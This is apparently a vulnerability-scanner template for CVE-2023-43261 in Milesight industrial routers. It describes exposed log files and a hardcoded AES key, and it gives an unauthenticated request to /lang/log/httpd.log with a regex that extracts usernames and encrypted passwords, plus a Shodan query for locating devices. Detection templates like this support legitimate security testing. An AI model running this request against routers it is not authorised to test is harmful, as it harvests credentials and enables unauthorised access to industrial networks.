id: CVE-2023-43261

info:
  name: Milesight Routers - Information Disclosure
  author: gy741
  severity: high
  description: |
    A critical security vulnerability has been identified in Milesight Industrial Cellular Routers, compromising the security of sensitive credentials and permitting unauthorized access. This vulnerability stems from a misconfiguration that results in directory listing being enabled on the router systems, rendering log files publicly accessible. These log files, while containing sensitive information such as admin and other user passwords (encrypted as a security measure), can be exploited by attackers via the router's web interface. The presence of a hardcoded AES secret key and initialization vector (IV) in the JavaScript code further exacerbates the situation, facilitating the decryption of these passwords. This chain of vulnerabilities allows malicious actors to gain unauthorized access to the router.
  reference:
    - https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
    - https://github.com/win3zz/CVE-2023-43261
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43261
    - http://milesight.com
    - http://ur5x.com
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-43261
    cwe-id: CWE-532
    epss-score: 0.00476
    epss-percentile: 0.7304
    cpe: cpe:2.3:o:milesight:ur5x_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: milesight
    product: ur5x_firmware
    shodan-query: http.html:rt_title
  tags: cve,cve2023,router,milesight,disclosure,unauth,iot

http:
  - method: GET
    path:
      - "{{BaseURL}}/lang/log/httpd.log"

    max-size: 5000

    extractors:
      - type: regex
        regex:
          - '"username":"([^"]+)","password":"(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)"'
# digest: 4a0a00473045022100a6f073ba34f0ebbb8dc8cb2703c5f89f0c614a35aaa05c8aab4593933c781c2c0220080fe55a1c1897709f4834e227728aa5d08aeb3df52893c593437c7b48cab053:922c64590222798bb761d5b6d8e72950